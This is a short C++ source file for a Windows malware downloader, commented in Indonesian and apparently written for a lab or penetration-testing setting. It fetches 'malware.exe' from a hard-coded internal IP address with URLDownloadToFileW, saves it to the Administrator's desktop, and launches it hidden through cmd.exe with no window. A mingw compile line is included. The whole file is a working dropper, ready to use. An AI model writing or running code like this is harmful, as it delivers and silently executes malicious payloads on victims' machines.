// lowanze
// compile x86_64-w64-mingw32-g++ file.cpp -o file.exe -lurlmon

#include <windows.h>
#include <urlmon.h>
#include <shlwapi.h>
#include <stdio.h>

#pragma comment(lib, "urlmon.lib")
#pragma comment(lib, "shlwapi.lib")

int main() {
    LPCWSTR url = L"http://10.18.3.26/malware.exe"; // URL file yang akan diunduh
    LPCWSTR path = L"C:\\Users\\Administrator\\Desktop\\malware.exe"; // path untuk menyimpan file Malware

    // download file menggunakan URLDownloadToFileW
    HRESULT hr = URLDownloadToFileW(NULL, url, path, 0, NULL);
    if (hr != S_OK) {
        printf("Failed to download file: %d", hr);
        return -1;
    }

    // menjalankan file unduhan .exe di latar belakang menggunakan CreateProcessW
    STARTUPINFOW si;
    PROCESS_INFORMATION pi;
    ZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);
    ZeroMemory(&pi, sizeof(pi));
    WCHAR cmd[256] = L"cmd.exe /c start /b "; // menggunakan cmd.exe untuk memanggil start /b
    wcscat_s(cmd, path); // menambahkan path file unduhan ke cmd
    if (!CreateProcessW(NULL, cmd, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
        printf("Failed to start process: %d", GetLastError());
        return -1;
    }

    return 0;
}
